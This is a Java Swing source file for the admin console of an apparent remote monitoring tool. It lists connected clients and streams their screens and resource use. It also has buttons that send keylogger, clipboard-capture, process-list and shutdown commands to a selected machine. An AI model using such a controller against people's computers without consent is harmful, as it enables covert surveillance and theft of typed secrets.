package swing;

import admin.Admin;
import models.SystemInfoModel;
import models.Worker;
import org.json.JSONTokener;
import swing.ContextMenu.ContextMenu;
import swing.button.ButtonCustom;
import swing.notification.Notification;
import swing.progressbar.ProgressBarCustom;
import swing.table.TableCustom;
import utils.console;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.util.HashMap;

import static utils.Command.*;

public class index extends JFrame {
    private JPanel main;
    private JTextArea txtarea_log;
    private JTextField txt_uuid;
    private ProgressBarCustom pgb_cpu;
    private ProgressBarCustom pgb_ram;
    private ProgressBarCustom pgb_disk;
    private ButtonCustom btn_logout;
    private ButtonCustom btn_process;
    private ButtonCustom btn_clipboard;
    private ButtonCustom btn_keylog;
    private JTable table;
    private JLabel lbl_uuid;
    private JLabel lbl_cpu;
    private JLabel lbl_ram;
    private JLabel lbl_disk;
    private JLabel lbl_ip;
    private JTextField txt_cpu;
    private JTextField txt_ram;
    private JTextField txt_disk;
    private JTextField txt_ip;
    private JLabel lbl_usage_cpu;
    private JLabel lbl_usage_ram;
    private JLabel lbl_usage_disk;
    private JLabel lbl_client_monitor;
    private JPanel left;
    private JPanel right;
    private JScrollPane jsp_table;
    private JPanel right_left;
    private JPanel right_right;
    private JPanel right_left_middle;
    private JPanel right_left_bottom;
    private JPanel right_right_top;
    private JPanel right_right_bottom;
    private JPanel right_right_middle;
    private JScrollPane jsp_txtarea_log;
    private JCheckBox toggle_monitor;
    private JCheckBox toggle_usage;
    private JPanel monitor;
    private JPanel usage;
    private JPanel right_left_top;
    private JPanel header;
    private JCheckBox toggle_all;
    private JPanel all;

    private String currentClientId;
    private static Admin admin;
    private static Notification notification;
    public static HashMap<String, Worker> workers = new HashMap<>();
    private static DefaultTableModel defaultTableModel = new DefaultTableModel();

    private static final String DISCONNECT_MESSAGE_TEMPLATE = "Client [%s] has disconnected!";
    private static final Object[] tableHeaders = {"Id", "Host Name", "Operating System", "Mac address", "Ip address"};
    private static final String FETCH_WORKER = "fetch_worker";
    private static final String MONITOR_WORKER = "monitor_worker";
    private static final String SYSTEM_USAGE_WORKER = "system_usage_worker";
    private static final Integer INDEX_WIDTH = 1200;
    private static final Integer INDEX_HEIGHT = 800;
    private static final Integer NOTIFICATION_SLEEP = 5000;
    private static final Color DISABLE_COLOR = new Color(230, 230, 230);

    public index() {
        initComponent();
        (admin = new Admin(this)).start();
        workers.put(FETCH_WORKER, new Worker(this::fetchTable)).start();
        workers.put(MONITOR_WORKER, new Worker(this::fetchClientMonitor)).start();
        workers.put(SYSTEM_USAGE_WORKER, new Worker(this::fetchClientSystemUsage)).start();
    }

    private void initComponent() {
        /**
         * Frame config
         */
        this.setSize(INDEX_WIDTH, INDEX_HEIGHT);
        this.setResizable(true);
        this.setContentPane(main);
        this.setLocationRelativeTo(null);
        this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        /**
         * Component config
         */
        this.header.setBackground(Color.WHITE);
        this.main.setBackground(Color.WHITE);
        this.left.setBackground(Color.WHITE);
        this.usage.setBackground(Color.WHITE);
        this.all.setBackground(Color.WHITE);
        this.right.setBackground(Color.WHITE);
        this.monitor.setBackground(Color.WHITE);
        this.right_left.setBackground(Color.WHITE);
        this.right_right.setBackground(Color.WHITE);
        this.right_left_top.setBackground(Color.WHITE);
        this.right_right_top.setBackground(Color.WHITE);
        this.right_left_middle.setBackground(Color.WHITE);
        this.right_left_bottom.setBackground(Color.WHITE);
        this.right_right_middle.setBackground(Color.WHITE);
        this.right_right_bottom.setBackground(Color.WHITE);
        EmptyBorder emptyBorder = new EmptyBorder(0, 0, 0, 0);
        this.txt_ip.setBorder(emptyBorder);
        this.txt_cpu.setBorder(emptyBorder);
        this.txt_ram.setBorder(emptyBorder);
        this.txt_disk.setBorder(emptyBorder);
        this.txt_uuid.setBorder(emptyBorder);
        /**
         * Table config
         */
        defaultTableModel.setColumnIdentifiers(tableHeaders);
        this.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        this.table.getSelectionModel().addListSelectionListener(new ListSelectionListener() {
            public void valueChanged(ListSelectionEvent e) {
                int selectedRow = table.getSelectedRow();
                if (selectedRow == -1) {
                    return;
                }
                currentClientId = (String) table.getValueAt(selectedRow, 0);
                SystemInfoModel client = admin.getClients().get(currentClientId);
                txt_uuid.setText(currentClientId);
                txt_ram.setText(client.getRam());
                txt_disk.setText(client.getDisk());
                txt_cpu.setText(client.getCpu());
                txt_ip.setText(client.getIp());
            }
        });
        this.table.setModel(defaultTableModel);
        TableCustom.apply(jsp_table, TableCustom.TableType.MULTI_LINE);
        /**
         * Listener config
         */
        this.addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {
                if (JOptionPane.showConfirmDialog(null,
                        "Are you sure you want to exit?", "Confirm exit?",
                        JOptionPane.YES_NO_OPTION,
                        JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
                    workers.forEach((key, val) -> val.destroy());
                    admin.onStop();
                }
            }
        });
        this.btn_clipboard.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_CLIPBOARD);
            }
        });
        this.btn_keylog.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_KEYLOGGER);
            }
        });
        this.btn_process.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                admin.onHandle(COMMAND_PROCESS);
            }
        });
        this.btn_logout.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (currentClientId == null) return;
                ShutdownDialog dialog = new ShutdownDialog(admin);
                /**
                 * Exception "AWT-EventQueue-0" java.lang.ArrayIndexOutOfBoundsException 0 >= 0
                 */
                dialog.setVisible(true);
            }
        });
        this.toggle_usage.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent e) {
                console.error("toggle_usage");
                if (toggle_usage.isSelected()) {
                    toggleUsageON();
                    return;
                }
                toggleUsageOFF();
            }
        });
        this.toggle_monitor.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent e) {
                console.error("toggle_monitor");
                if (toggle_monitor.isSelected()) {
                    toggleMonitorON();
                    return;
                }
                toggleMonitorOFF();
            }
        });
        this.toggle_all.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (toggle_all.isSelected()) {
                    toggleAllON();
                    return;
                }
                toggleAllOFF();
            }
        });
        /**
         * External config
         */
        ContextMenu.addDefaultContextMenu(txtarea_log);
        notification = new Notification(this, Notification.Type.WARNING, Notification.Location.TOP_CENTER);
    }

    private void toggleUsageON() {
        workers.get(SYSTEM_USAGE_WORKER).resume();
        workers.get(SYSTEM_USAGE_WORKER).setStatus(true);
        right_right_middle.setBackground(Color.WHITE);
        pgb_cpu.setBackground(Color.WHITE);
        pgb_disk.setBackground(Color.WHITE);
        pgb_ram.setBackground(Color.WHITE);
    }

    private void toggleUsageOFF() {
        setToggleAll(false);
        right_right_middle.setBackground(DISABLE_COLOR);
        pgb_cpu.setBackground(DISABLE_COLOR);
        pgb_disk.setBackground(DISABLE_COLOR);
        pgb_ram.setBackground(DISABLE_COLOR);
        fetchClientSystemUsage(0, 0, 0);
        workers.get(SYSTEM_USAGE_WORKER).suspend();
        workers.get(SYSTEM_USAGE_WORKER).setStatus(false);
        notification.showNotification("System usage stream stopped", NOTIFICATION_SLEEP, Notification.Type.INFO);
    }

    private void toggleMonitorON() {
        lbl_client_monitor.setIcon(new ImageIcon(getClass().getResource("loading.gif")));
        right_left_middle.setBackground(Color.WHITE);
        lbl_client_monitor.setText(null);
        workers.get(MONITOR_WORKER).resume();
        workers.get(MONITOR_WORKER).setStatus(true);
    }

    private void toggleMonitorOFF() {
        setToggleAll(false);
        lbl_client_monitor.setIcon(null);
        lbl_client_monitor.setText("OFF");
        right_left_middle.setBackground(DISABLE_COLOR);
        workers.get(MONITOR_WORKER).suspend();
        workers.get(MONITOR_WORKER).setStatus(false);
        notification.showNotification("Monitor stream stopped", NOTIFICATION_SLEEP, Notification.Type.INFO);
    }

    private void toggleAllON() {
        this.toggle_usage.setSelected(true);
        this.toggle_monitor.setSelected(true);
    }

    private void toggleAllOFF() {
        this.toggle_usage.setSelected(false);
        this.toggle_monitor.setSelected(false);
    }

    private void setToggleAll(boolean bool) {
        this.toggle_all.setSelected(bool);
    }

    public void fetchTable() {
        while (true) {
            console.log("[FETCH] Fetch table");
            try {
                (defaultTableModel = new DefaultTableModel()).setColumnIdentifiers(tableHeaders);
                admin.getClients().forEach((key, value) -> {
                    defaultTableModel.addRow(new Object[]{
                            key,
                            value.getHostName(),
                            value.getOs(),
                            value.getMAC_address(),
                            value.getIp()});
                });
                table.setModel(defaultTableModel);
                Thread.currentThread().sleep(5000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public void fetchClientMonitor() {
        while (true) {
            try {
                console.log("[FETCH] Client monitor");
                if (currentClientId != null) {
                    admin.onHandle(COMMAND_CLIENT_SCREEN);
                }
                Thread.currentThread().sleep(1000);
            } catch (InterruptedException e) {
                e.getStackTrace();
                throw new RuntimeException(e);
            }
        }
    }

    public void fetchClientSystemUsage() {
        while (true) {
            console.log("[FETCH] Client system usage");
            try {
                if (currentClientId != null) {
                    admin.onHandle(COMMAND_MONITORING);
                }
                Thread.currentThread().sleep(2000);
            } catch (InterruptedException e) {
                e.getStackTrace();
                throw new RuntimeException(e);
            }
        }
    }

    public void fetchClientMonitor(ImageIcon imageIcon) {
        if(!workers.get(MONITOR_WORKER).getStatus()) return;
        lbl_client_monitor.setText(null);
        lbl_client_monitor.setBorder(null);
        lbl_client_monitor.setIcon(new ImageIcon(imageIcon.getImage().getScaledInstance(400, 300, Image.SCALE_SMOOTH)));
    }

    public void fetchClientSystemUsage(int cpu, int ram, int disk) {
        if(!workers.get(SYSTEM_USAGE_WORKER).getStatus()) return;
        this.pgb_cpu.setValue(cpu);
        this.pgb_ram.setValue(ram);
        this.pgb_disk.setValue(disk);
    }

    public void appendLog(String message) {
        txtarea_log.append(message + "\n");
    }

    public void sync() {
        notification.showNotification(String.format(DISCONNECT_MESSAGE_TEMPLATE, currentClientId.substring(0, currentClientId.length() / 2)), NOTIFICATION_SLEEP, Notification.Type.INFO);
        for (int i = defaultTableModel.getRowCount() - 1; i >= 0; i--) {
            if (defaultTableModel.getValueAt(i, 0).equals(currentClientId)) defaultTableModel.removeRow(i);
        }
        currentClientId = null;
        txt_uuid.setText(null);
        txt_cpu.setText(null);
        txt_ram.setText(null);
        txt_disk.setText(null);
        txt_ip.setText(null);
        pgb_cpu.setValue(0);
        pgb_ram.setValue(0);
        pgb_disk.setValue(0);
        txtarea_log.setText(null);
    }

    public void showNotification(String message){
        notification.showNotification(message, NOTIFICATION_SLEEP, Notification.Type.INFO);
    }

    public String getCurrentClientId() {
        return currentClientId;
    }
}